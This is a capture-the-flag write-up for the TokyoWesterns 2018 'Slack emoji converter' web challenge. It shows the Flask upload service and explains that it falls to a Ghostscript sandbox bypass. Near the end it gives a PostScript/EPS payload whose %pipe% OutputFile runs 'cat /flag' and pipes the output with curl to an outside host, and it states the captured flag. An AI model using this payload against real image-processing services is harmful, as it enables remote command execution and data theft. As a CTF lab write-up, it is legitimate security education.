# Slack emoji converter (web, 267p, 29 solved)

```
create your own emoji for Slack at http://emoji.chal.ctf.westerns.tokyo
```

This task is a perfect example of CTF challenge naming conventions - because the challenge has absolutely zero relation to slack, emojis, and conversions.

We are expected to exploit the website http://emoji.chal.ctf.westerns.tokyo/.

The first challenge was to figure out how to drag&drop files from my heavily modified linux installation with i3wm and progressively more completely corrupted APT database. To be hones, I just took the easy way out and used Windows VM.

Anyway the real challenge was to read the source code and find vulnerability:

```python
from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    make_response,
)
from PIL import Image
import tempfile
import os


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/source')
def source():
    return open(__file__).read()

@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    os.unlink(fname)
    return response
```

See it yet? No? Probably because there's none. This means that there is 90% chance that ghostscript guys screwed up something again and whole internet is on fire.
So we quickly googled something equivalent to `how do I pwn ghostscript in 2018` and found [this gem](http://openwall.com/lists/oss-security/2018/08/21/2): http://openwall.com/lists/oss-security/2018/08/21/2. This looked really interesting (announcement was from only few days ago!), so I decided to give it a try.

Of course not a single exploit worked on my broken good-for-nothing machine, so I almost lost hope at that moment. We almost spent 3 more hours searching for a different solution. Fortunately, I decided to craft one more exploit and send it to remote server as a last resort (via my Windows VM, of course). And you guessed it, it worked. Interesting fragment:

```
a5
1 .pushpdf14devicefilter
save
legal
restore
mark /OutputFile (%pipe%cat /flag | curl tailcall.net:3333 -X POST -d @/dev/stdin) currentdevice putdeviceprops
showpage
```

Whole exploit file [circle.eps](circle.eps).

`TWCTF{watch_0ut_gh0stscr1pt_everywhere}`